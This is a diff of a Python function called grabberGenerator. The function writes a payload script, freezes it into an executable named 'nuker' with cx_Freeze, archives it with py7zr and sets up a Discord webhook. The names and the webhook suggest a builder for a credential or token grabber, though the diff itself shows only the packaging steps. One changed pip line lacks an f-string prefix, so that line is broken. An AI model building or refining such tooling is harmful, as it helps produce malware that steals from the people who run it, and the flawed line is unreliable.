@@ -90,12 +90,17 @@ def grabberGenerator():
             
             discord = discordWebhook.DiscordWebhook(webhookUrl=webhookUrl)
             os.makedirs("temp", exist_ok=True)
+            bLibraries = []
+            for library in libraries:
+                bLibraries.append(library.lower()
+                    .replace("pillow", "PIL")
+                )
             setupScript = ["from cx_Freeze import setup, Executable",
                             "setup(",
                             "   name=\"nuker\",",
                             "   version=\"1.0\",",
                             "   description=\"\",",
-                            "   options={'build_exe': {'packages': "+str(libraries)+", \"build_exe\": \"./temp/nuker\"}},",
+                            "   options={'build_exe': {'packages': "+str(bLibraries)+", \"build_exe\": \"./temp/nuker\"}},",
                             "   executables=[Executable(\"temp/"+randomStr+".py\")]",
                             ")"]
             with open(f"temp/{randomStr}.py", mode="w") as f:
@@ -103,7 +108,7 @@ def grabberGenerator():
             with open(f"temp/{randomStr}-setup.py", mode="w") as f:
                 f.write("\n".join(setupScript))
             
-            subprocess.run("pip install --upgrade pip "+" ".join(libraries), shell=True)
+            subprocess.run("\"{sys.executable}\" -m pip install --upgrade pip "+" ".join(libraries), shell=True)
             subprocess.run(f"\"{sys.executable}\" ./temp/{randomStr}-setup.py build", shell=True)
             with py7zr.SevenZipFile("nuker.7z", 'w', filters=[{'id': py7zr.FILTER_LZMA2, 'preset': 9}]) as archive:
                 archive.writeall("./temp/nuker/", arcname='')
